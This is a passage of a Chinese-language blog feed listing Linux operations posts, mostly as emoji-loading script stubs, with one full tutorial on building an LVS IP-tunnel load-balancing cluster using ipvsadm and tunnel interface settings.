    <title>实战-GitLab更新代码后自动触发Jenkins进行部署</title>
    <link href="https://marnm.github.io//posts/f5d6f6a9/"/>
    <id>https://marnm.github.io//posts/f5d6f6a9/</id>
    <published>2022-06-07T05:41:59.000Z</published>
    <updated>2022-06-07T05:46:04.471Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>搭建Jenkins实现持续集成-配置Jenkins自动拉取GitLab中的代码</title>
    <link href="https://marnm.github.io//posts/8a3c5d26/"/>
    <id>https://marnm.github.io//posts/8a3c5d26/</id>
    <published>2022-06-07T05:41:46.000Z</published>
    <updated>2022-06-07T05:46:04.473Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>配置GitLab邮件服务</title>
    <link href="https://marnm.github.io//posts/2b923a54/"/>
    <id>https://marnm.github.io//posts/2b923a54/</id>
    <published>2022-06-07T05:41:33.000Z</published>
    <updated>2022-06-07T05:46:04.476Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>增加一台Filebeat收集httpd日志</title>
    <link href="https://marnm.github.io//posts/f801d3c5/"/>
    <id>https://marnm.github.io//posts/f801d3c5/</id>
    <published>2022-06-07T05:40:50.000Z</published>
    <updated>2022-06-07T05:46:04.472Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis编译安装</title>
    <link href="https://marnm.github.io//posts/41f893fd/"/>
    <id>https://marnm.github.io//posts/41f893fd/</id>
    <published>2022-06-07T05:40:24.000Z</published>
    <updated>2022-06-07T05:46:04.461Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Logstash去除不需要的字段</title>
    <link href="https://marnm.github.io//posts/b11339a9/"/>
    <id>https://marnm.github.io//posts/b11339a9/</id>
    <published>2022-06-07T05:38:53.000Z</published>
    <updated>2022-06-07T05:46:04.456Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://marnm.github.io//posts/2f57a694/"/>
    <id>https://marnm.github.io//posts/2f57a694/</id>
    <published>2022-06-07T05:38:42.000Z</published>
    <updated>2022-06-07T05:46:04.477Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Logstash读取日志发送到ES</title>
    <link href="https://marnm.github.io//posts/d05b44e0/"/>
    <id>https://marnm.github.io//posts/d05b44e0/</id>
    <published>2022-06-07T05:38:29.000Z</published>
    <updated>2022-06-07T05:46:04.457Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Logstash二进制安装与启动</title>
    <link href="https://marnm.github.io//posts/573fc171/"/>
    <id>https://marnm.github.io//posts/573fc171/</id>
    <published>2022-06-07T05:38:20.000Z</published>
    <updated>2022-06-07T05:46:04.455Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Ansible自动化管理</title>
    <link href="https://marnm.github.io//posts/b45e213f/"/>
    <id>https://marnm.github.io//posts/b45e213f/</id>
    <published>2022-06-07T05:36:40.000Z</published>
    <updated>2022-06-07T05:46:04.433Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Ceph分布式存储</title>
    <link href="https://marnm.github.io//posts/e9abc941/"/>
    <id>https://marnm.github.io//posts/e9abc941/</id>
    <published>2022-06-07T05:36:20.000Z</published>
    <updated>2022-06-07T05:46:04.431Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>LVS-IPTUN集群</title>
    <link href="https://marnm.github.io//posts/df68056c/"/>
    <id>https://marnm.github.io//posts/df68056c/</id>
    <published>2022-06-07T05:35:10.000Z</published>
    <updated>2022-06-12T04:30:46.628Z</updated>
    
    <content type="html"><![CDATA[<hr><p>title: LVS-IPTUN&#x96C6;&#x7FA4;<br>abbrlink: df68056c<br>date: 2022-06-07 13:35:10<br>tags: LVS</p><hr><h2 id="LVS-IP-Tunnel&#x6A21;&#x5F0F;&#x96C6;&#x7FA4;"><a href="#LVS-IP-Tunnel&#x6A21;&#x5F0F;&#x96C6;&#x7FA4;" class="headerlink" title="LVS-IP Tunnel&#x6A21;&#x5F0F;&#x96C6;&#x7FA4;"></a>LVS-IP Tunnel&#x6A21;&#x5F0F;&#x96C6;&#x7FA4;</h2><p>DR&#x65B9;&#x5F0F;&#x662F;&#x901A;&#x8FC7;MAC&#xFF0C;&#x89C4;&#x6A21;&#x662F;&#x4E00;&#x4E2A;&#x4EA4;&#x6362;&#x7F51;&#x7EDC;&#xFF1B;<br>&#x800C;IP Tun&#x65B9;&#x5F0F;&#xFF0C;&#x662F;&#x901A;&#x8FC7;&#x683C;&#x5F0F;&#x6570;&#x636E;&#x5305;&#x52A0;&#x4E0A;&#x65B0;&#x7684;IP&#x5934;&#x90E8;&#x6765;&#x5B9E;&#x73B0;&#xFF0C;&#x8FD9;&#x4E2A;&#x53EF;&#x4EE5;&#x8DE8;&#x6574;&#x4E2A;&#x5E7F;&#x57DF;&#x7F51;</p><p><img src="http://192.168.84.188:8081/uploads/1654946401852771703lvstun.png" alt=""><br>&#x5F02;&#x5730;&#x673A;&#x623F;&#x7684;&#x597D;&#x5904;&#xFF1A;&#x5BB9;&#x707E;</p><p>&#x4F46;&#x662F;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x4FDD;&#x8BC1; &#x8FB9;&#x754C; &#x6700;&#x8FD1;&#x8BBF;&#x95EE;&#x5230;&#x5BF9;&#x5E94;&#x7684;real server&#x5462;&#xFF1F; &#x4E0D;&#x80FD;&#xFF0C;&#x8FD9;&#x662F;&#x6700;&#x5927;&#x7684;&#x95EE;&#x9898;</p><p>DNS view&#x529F;&#x80FD;&#x5B9E;&#x73B0;  &#x8FB9;&#x754C;&#x6700;&#x8FD1;&#x8BBF;&#x95EE;  &#x667A;&#x80FD;DNS<br><img src="http://192.168.84.188:8081/uploads/1654946703638063644lvsiptuntop.png" alt=""></p><p><strong>Director</strong><br>DIP<code>192.168.110.13</code><br>DG<code>192.168.110.1</code><br>VIP<code>192.168.110.10</code>  </p><p><strong>RS1</strong><br>RIP<code>192.168.110.11</code><br>DG<code>192.168.110.1</code><br>VIP<code>192.168.110.10</code>  </p><p><strong>RS2</strong><br>RIP<code>192.168.110.12</code><br>DG<code>192.168.110.1</code><br>VIP<code>192.168.110.10</code></p><p><strong>&#x914D;&#x7F6E;Director</strong></p><pre><code>[root@server13 ~]# ifconfigens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 192.168.110.13  netmask 255.255.255.0  broadcast 192.168.110.255        inet6 fe80::20c:29ff:fe1d:b97c  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:0c:29:1d:b9:7c  txqueuelen 1000  (Ethernet)        RX packets 136  bytes 12339 (12.0 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 89  bytes 11483 (11.2 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1  (Local Loopback)        RX packets 0  bytes 0 (0.0 B)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 0  bytes 0 (0.0 B)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0[root@server13 ~]# ifconfig ens33:1 192.168.110.10 netmask 255.255.255.0[root@server13 ~]# ifcofngi-bash: ifcofngi: command not found[root@server13 ~]# ifconfigens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 192.168.110.13  netmask 255.255.255.0  broadcast 192.168.110.255        inet6 fe80::20c:29ff:fe1d:b97c  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:0c:29:1d:b9:7c  txqueuelen 1000  (Ethernet)        RX packets 315  bytes 25839 (25.2 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 184  bytes 21161 (20.6 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0ens33:1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 192.168.110.10  netmask 255.255.255.0  broadcast 192.168.110.255        ether 00:0c:29:1d:b9:7c  txqueuelen 1000  (Ethernet)lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1  (Local Loopback)        RX packets 0  bytes 0 (0.0 B)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 0  bytes 0 (0.0 B)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0[root@server13 ~]#</code></pre><pre><code>[root@server13 ~]# ipvsadm -C[root@server13 ~]# ipvsadm -A -t 192.168.110.10:80 -s rr[root@server13 ~]# ipvsadm -a -t 192.168.110.10:80 -r 192.168.110.12 -i[root@server13 ~]# ipvsadm -a -t 192.168.110.10:80 -r 192.168.110.11 -i[root@server13 ~]# ipvsadm -LnIP Virtual Server version 1.2.1 (size=4096)Prot LocalAddress:Port Scheduler Flags  -&gt; RemoteAddress:Port           Forward Weight ActiveConn InActConnTCP  192.168.110.10:80 rr  -&gt; 192.168.110.11:80            Tunnel  1      0          0  -&gt; 192.168.110.12:80            Tunnel  1      0          0[root@server13 ~]#</code></pre><p><strong>&#x914D;&#x7F6E;Real Server</strong></p><pre><code>[root@server11 ~]# ifconfigens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 192.168.110.11  netmask 255.255.255.0  broadcast 192.168.110.255        inet6 fe80::250:56ff:fe27:4bff  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:50:56:27:4b:ff  txqueuelen 1000  (Ethernet)        RX packets 147  bytes 13187 (12.8 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 90  bytes 11445 (11.1 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1  (Local Loopback)        RX packets 0  bytes 0 (0.0 B)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 0  bytes 0 (0.0 B)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0[root@server11 ~]# route -nKernel IP routing tableDestination     Gateway         Genmask         Flags Metric Ref    Use Iface0.0.0.0         192.168.110.1   0.0.0.0         UG    0      0        0 ens33169.254.0.0     0.0.0.0         255.255.0.0     U     1002   0        0 ens33192.168.110.0   0.0.0.0         255.255.255.0   U     0      0        0 ens33[root@server11 ~]# modprobe ipip# &#x52A0;&#x8F7D;ipip&#x96A7;&#x9053;&#x6A21;&#x5757;# &#x4F7F;&#x7528;ifconfig tunl0&#x65F6;&#xFF0C;&#x4F1A;&#x81EA;&#x52A8;&#x52A0;&#x8F7D;ipip&#x6A21;&#x5757;[root@server11 network-scripts]# lsmod | grep ipipipip                   13465  0tunnel4                13252  1 ipipip_tunnel              25163  1 ipip[root@server11 network-scripts]# ifconfig -aens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 192.168.110.11  netmask 255.255.255.0  broadcast 192.168.110.255        inet6 fe80::250:56ff:fe27:4bff  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:50:56:27:4b:ff  txqueuelen 1000  (Ethernet)        RX packets 2159  bytes 170181 (166.1 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 1206  bytes 153724 (150.1 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1  (Local Loopback)        RX packets 0  bytes 0 (0.0 B)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 0  bytes 0 (0.0 B)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0tunl0: flags=128&lt;NOARP&gt;  mtu 1480        tunnel   txqueuelen 1  (IPIP Tunnel)        RX packets 0  bytes 0 (0.0 B)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 0  bytes 0 (0.0 B)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0[root@server11 network-scripts]# ifconfig tunl0 192.168.110.10 netmask 255.255.255.255[root@server11 network-scripts]# ifconfigens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 192.168.110.11  netmask 255.255.255.0  broadcast 192.168.110.255        inet6 fe80::250:56ff:fe27:4bff  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:50:56:27:4b:ff  txqueuelen 1000  (Ethernet)        RX packets 2391  bytes 187611 (183.2 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 1326  bytes 166252 (162.3 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1  (Local Loopback)        RX packets 0  bytes 0 (0.0 B)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 0  bytes 0 (0.0 B)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0tunl0: flags=193&lt;UP,RUNNING,NOARP&gt;  mtu 1480        inet 192.168.110.10  netmask 255.255.255.255        tunnel   txqueuelen 1  (IPIP Tunnel)        RX packets 0  bytes 0 (0.0 B)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 0  bytes 0 (0.0 B)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0[root@server11 network-scripts]#[root@server11 network-scripts]# echo &apos;1&apos; &gt; /proc/sys/net/ipv4/conf/tunl0/arp_ignore[root@server11 network-scripts]# echo &apos;2&apos; &gt; /proc/sys/net/ipv4/conf/tunl0/arp_announce[root@server11 network-scripts]# echo &apos;1&apos; &gt; /proc/sys/net/ipv4/conf/all/arp_ignore[root@server11 network-scripts]# echo &apos;2&apos; &gt; /proc/sys/net/ipv4/conf/all/arp_announce[root@server11 network-scripts]# echo &apos;0&apos; &gt; /proc/sys/net/ipv4/conf/tunl0/rp_filter[root@server11 network-scripts]# echo &apos;0&apos; &gt; /proc/sys/net/ipv4/conf/all/rp_filter[root@server11 network-scripts]#</code></pre><pre><code>[root@server12 ~]# ifconfigens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 192.168.110.12  netmask 255.255.255.0  broadcast 192.168.110.255        inet6 fe80::250:56ff:fe33:b03c  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:50:56:33:b0:3c  txqueuelen 1000  (Ethernet)        RX packets 147  bytes 13091 (12.7 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 90  bytes 10365 (10.1 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1  (Local Loopback)        RX packets 0  bytes 0 (0.0 B)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 0  bytes 0 (0.0 B)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0[root@server12 ~]# route -nKernel IP routing tableDestination     Gateway         Genmask         Flags Metric Ref    Use Iface0.0.0.0         192.168.110.1   0.0.0.0         UG    0      0        0 ens33169.254.0.0     0.0.0.0         255.255.0.0     U     1002   0        0 ens33192.168.110.0   0.0.0.0         255.255.255.0   U     0      0        0 ens33[root@server12 ~]# modprobe ipip[root@server12 ~]# ifconfig -aens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 192.168.110.12  netmask 255.255.255.0  broadcast 192.168.110.255        inet6 fe80::250:56ff:fe33:b03c  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:50:56:33:b0:3c  txqueuelen 1000  (Ethernet)        RX packets 1185  bytes 92769 (90.5 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 688  bytes 75786 (74.0 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1  (Local Loopback)        RX packets 0  bytes 0 (0.0 B)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 0  bytes 0 (0.0 B)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0tunl0: flags=128&lt;NOARP&gt;  mtu 1480        tunnel   txqueuelen 1  (IPIP Tunnel)        RX packets 0  bytes 0 (0.0 B)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 0  bytes 0 (0.0 B)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0[root@server12 ~]# ifconfig tunl0 192.168.110.10 netmask 255.255.255.255[root@server12 ~]# ifconfigens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 192.168.110.12  netmask 255.255.255.0  broadcast 192.168.110.255        inet6 fe80::250:56ff:fe33:b03c  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:50:56:33:b0:3c  txqueuelen 1000  (Ethernet)        RX packets 1386  bytes 107919 (105.3 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 795  bytes 87800 (85.7 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1  (Local Loopback)        RX packets 0  bytes 0 (0.0 B)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 0  bytes 0 (0.0 B)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0tunl0: flags=193&lt;UP,RUNNING,NOARP&gt;  mtu 1480        inet 192.168.110.10  netmask 255.255.255.255        tunnel   txqueuelen 1  (IPIP Tunnel)        RX packets 0  bytes 0 (0.0 B)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 0  bytes 0 (0.0 B)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0[root@server12 ~]#[root@server12 ~]# echo &apos;1&apos; &gt; /proc/sys/net/ipv4/conf/tunl0/arp_ignore[root@server12 ~]# echo &apos;2&apos; &gt; /proc/sys/net/ipv4/conf/tunl0/arp_announce[root@server12 ~]# echo &apos;1&apos; &gt; /proc/sys/net/ipv4/conf/all/arp_ignore[root@server12 ~]# echo &apos;2&apos; &gt; /proc/sys/net/ipv4/conf/all/arp_announce[root@server12 ~]# echo &apos;0&apos; &gt; /proc/sys/net/ipv4/conf/tunl0/rp_filter[root@server12 ~]# echo &apos;0&apos; &gt; /proc/sys/net/ipv4/conf/all/rp_filter[root@server12 ~]#</code></pre><p><code>tunl0/rp_fileter</code>&#x6A21;&#x5F0F;&#x4E3A;1&#xFF0C;&#x9700;&#x8981;&#x6539;&#x4E3A;0&#xFF0C;&#x5173;&#x95ED;&#x6B64;&#x529F;&#x80FD;&#x3002;Linux&#x7684;rp_fileter&#x7528;&#x4E8E;<strong>&#x5B9E;&#x73B0;&#x53CD;&#x5411;&#x8FC7;&#x6EE4;&#x6280;&#x672F;&#xFF0C;&#x4E5F;&#x53EB;uRPF</strong>&#xFF0C;&#x5B83;&#x9A8C;&#x8BC1;&#x53CD;&#x5411;&#x6570;&#x636E;&#x5305;&#x7684;&#x6D41;&#x5411;&#xFF0C;&#x4EE5;&#x907F;&#x514D;&#x4F2A;&#x88C5;IP&#x653B;&#x51FB;&#xFF0C;&#x7136;&#x540E;&#xFF0C;&#x5728;LVS TUN&#x6A21;&#x5F0F;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x7684;&#x6570;&#x636E;&#x5305;&#x65F6;&#x6709;&#x95EE;&#x9898;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x4ECE;Real Server ens33 &#x51FA;&#x53BB;&#x7684;IP&#x6570;&#x636E;&#x5305;&#x7684;&#x6E90;IP&#x5730;&#x5740;&#x5E94;&#x8BE5;&#x4E3A;192.168.110.11&#xFF0C;&#x800C;&#x4E0D;&#x662F;VIP&#x5730;&#x5740;&#xFF0C;&#x6240;&#x4EE5;&#x5FC5;&#x987B;&#x5173;&#x95ED;&#x8FD9;&#x4E00;&#x9879;&#x529F;&#x80FD;&#x3002; DR&#x548C;TUN&#x5728; &#x7F51;&#x7EDC;&#x5C42;&#x5B9E;&#x9645;&#x4E0A;&#x4F7F;&#x7528;&#x4E86;&#x4E00;&#x4E2A;&#x4F2A;&#x88C5;IP&#x6570;&#x636E;&#x5305;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x8BA9;client&#x6536;&#x5230;&#x6570;&#x636E;&#x5305;&#x540E;&#xFF0C;&#x8FD4;&#x56DE;&#x7684;&#x8BF7;&#x6C42;&#x518D;&#x6B21;&#x8F6C;&#x7ED9;&#x5206;&#x53D1;&#x5668;<br><code>echo &apos;0&apos; &gt; /proc/sys/net/ipv4/conf/all/rp_filter</code> #&#x8FD9;&#x4E2A;&#x503C;&#x9ED8;&#x8BA4;&#x5C31;&#x662F;0&#xFF0C;&#x6B64;&#x529F;&#x80FD;&#x5C31;&#x662F;&#x5173;&#x95ED;&#x7684;&#x3002;&#x6240;&#x4EE5;&#x5728;LVS DR&#x6A21;&#x5F0F;&#x4E2D;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x4FEE;&#x6539;&#x8FD9;&#x4E00;&#x6837;&#x5185;&#x6838;&#x53C2;&#x6570;</p><h2 id="&#x6269;&#x5C55;&#xFF1A;Shell"><a href="#&#x6269;&#x5C55;&#xFF1A;Shell" class="headerlink" title="&#x6269;&#x5C55;&#xFF1A;Shell"></a>&#x6269;&#x5C55;&#xFF1A;Shell</h2><p><strong>&#x914D;&#x7F6E;Director</strong> </p><pre><code class="shell">#!/bin/bashifconfig ens33 192.168.110.15ifconfig ens33:1 192.168.110.10yum install -y ipvsadmipvsadm --clearipvsadm -Cipvsadm -A -t 192.168.110.10:80 -s rripvsadm -a -t 192.168.110.10:80 -r 192.168.110.11 -iipvsadm -a -t 192.168.110.10:80 -r 192.168.110.12 -i# -i IP Tunnel Model</code></pre><p><strong>&#x914D;&#x7F6E;RS</strong>  </p><pre><code class="shell">#!/bin/bashifconfig lo 192.168.110.10 netmask 255.255.255.255 up# Disable ARP forwardifconfig ens33 -arp# Permanent ways:#echo 1 &gt; /proc/sys/net/ipv4/conf/ens33/arp_ignore#echo 2 &gt; /proc/sys/net/ipv4/conf/ens33/apr_announce##############################################33333#echo &quot;net.ipv4.conf.ens33.arp_ignore = 1&quot; &gt;&gt; /etc/sysctl.conf#echo &quot;net.ipv4.conf.ens33.arp_announce = 2&quot; 